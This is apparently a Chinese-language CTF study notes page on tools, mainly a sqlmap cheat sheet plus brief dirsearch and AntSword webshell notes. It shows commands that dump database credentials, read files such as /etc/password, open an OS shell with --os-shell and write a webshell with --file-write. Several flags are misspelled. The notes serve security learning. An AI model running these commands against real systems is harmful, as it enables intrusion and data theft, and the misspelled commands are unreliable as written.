---
{"dg-publish":true,"permalink":"/c5/ctf/ctf/ctf/","dgPassFrontmatter":true}
---

#CTF-工具
https://websec.readthedocs.io/zh/latest/intranet/index.html

**BP**:抓包工具，啥都能用
**Dirsearch**:用 Python 编写的开源的目录和文件扫描工具，常用于网站的信息收集阶段，通过对目标网站进行目录和文件的枚举，帮助发现网站上可能存在的敏感目录或文件[[0-Dirsearch使用教程\|0-Dirsearch使用教程]]


# SQLMAP使用
#CTF-工具 
## 参数介绍和示例

`-r`：万能参数，主要针对post注入，但是任何其他请求方法都是可以的，但这个参数用的最多
```
sqlmap.py -r c:\2.txt
```
`-u`：只针对get请求方法的注入
```
sqlmap.py -u http://192.168.0.15/sql.php?id=1
```
`--level=LEVEL`:执行测试的等级（1-5,默认为1），使用`-level`参数且数值>=2时候会检查cookie里面的参数，当>=3的时候将检查`user-agent`和`Referer`
```
sqlmap.py -r c:\2.txt --level 3
```
`--risk=RISK`:执行测试的风险（0-3，默认为1），默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试
```
sqlmap.py -r c:\2.txt --level 3 --risk 3
```
`v`:显示详细信息的意思，ERBOSE信息级别：0-6（缺省默认1），其值具体含义：“0”只显示Python错误以及严重的信息；“1”同时显示基本信息和警告信息（默认）；“2”同时显示debug信息：“3”同时显示注入的payload；“4”同时显示HTTP请求；“5”同时显示HTTP响应头；“6”同时显示HTTP响应页面；如果想看到sqlmap发送的测试payload最好的等级就是3，设置为5的话，可以看到http响应信息，比较详细
```
sqlmap.py -r c:\2.txt --level 3 --risk 3-v 3
```
`p`:针对某一个参数进行注入，当我们发现注入点的时候，比如网址`http://192.168.203.141/sql.php?id=1`只有一个参数id,而当有些网址有很多参数，那么我们可以针对指定的参数进行注入
```
sqlmap.py -u http://192.168.203.15/sql.php?id=1 -p id
```
`--threads`：线程数，如果想要sqlmap跑的更快，可以更改这个线程数的值，默认为10
```
sqlmap.py -u http://192.168.203.15/sql.php?id=1 -p id --threads 20
```
`-batch-smart`:智能判断测试，自行寻找注入点进行测试,能趴到好多数据，如果想结束指令的执行`ctrl+c`，这个智能指令，会将所有数据库全部扒一遍，并且会将每一步的信息和数据全部给我们保存下来，在sqlmap的output文件夹下面
```
sqlmap.py -u http://192.168.203.15/sql.php?id=1 -batch-smart
```
## 注入获取数据的相关参数
```
--dbs:会获取所有的数据库。默认情况下sqlmap会自动的探测web应用后端的数据库类型：MySQL、Orcacle,PostgreSQL,MicrosoftSQL,Server,Microsoft Access,SQLite,Firebird,Sybase,SAPMaxDB,DB2
--current-user:大多数数据库中可检测到数据库管理系统当前用户
--current-db:当前连接数据库名
--is-dba:判断当前的用户是否为管理
--users:列出数据库所有所有用户
```
以网址`http://192.168.203.143/sql.php?id=1`来走一般完整注入过程
```
http://192.168.203.143/sql.php?id=1 --dbs #会获取所有的数据库
http://192.168.203.143/sql.php?id=1 --current-user #显示当前用户
http://192.168.203.143/sql.php?id=1 --current-db #当前连接数据库名
http://192.168.203.143/sql.php?id=1 --is-dba #判断当前的用户是否为管理
http://192.168.203.143/sql.php?id=1 --users #列出数据库所有所有用户
```
然后按照下面的几个参数来获取细节数据。
**`-tables`获取表名**：-D是指定某个数据库，如果不加-D参数，那么会将所有数据库的所有表获取出来，最好指定数据库名，这样精准快速一些
```
--tables -D 数据库名
```
**`--columns`获取字段名**：
```
--cloumns -T user -D abc
```
**获取数据**
```
-T user -C username,password,email --dump
```
**读文件内容**
```
--file-read /etc/password
如果我们想要读取目标主机的c:\\2.txt文件的数据
sqlmap.py -u http://192.168.203.141/sql.php?id=1 --file-read c:\\2.txt
```
**系统交互的shell**:`--os-shell`
```
sqlmap.py -u http://192.168.203.141/sqlserver/1.aspx?xxser=1 --os-shell
```
**写webshell** :`--file-wirte`
```
指令
--file-write "c:/2.txt" --file-dest "C:/php/htdocs/sql.php" -v 1

--file-write "c:/2.txt" --file-dest"C:\phpStudy\PHPTutoria\www\xx.php" -v 1
```



# antsword蚁剑使用教程
#CTF-RCE #CTF-命令执行 

[贴一篇使用博客](https://blog.csdn.net/qq_53079406/article/details/123302775)
## 一、antsword的webshell使用

第一步：在首页空白处右键-----添加数据（shell)
![Pasted image 20250405095548.png|450](/img/user/PNG/Pasted%20image%2020250405095548.png)
第二步：输入要挂马的地址和连接密码，添加保存（选个加密方法）
![Pasted image 20250405100610.png|450](/img/user/PNG/Pasted%20image%2020250405100610.png)

# dirsearch 目录扫描使用教程
#CTF-信息收集 
常用命令
```
python3 dirsearch.py -u url地址
```

# nmap使用

# GIT的使用
[大佬的文章，写的非常全面](https://blog.csdn.net/mukes/article/details/115693833)
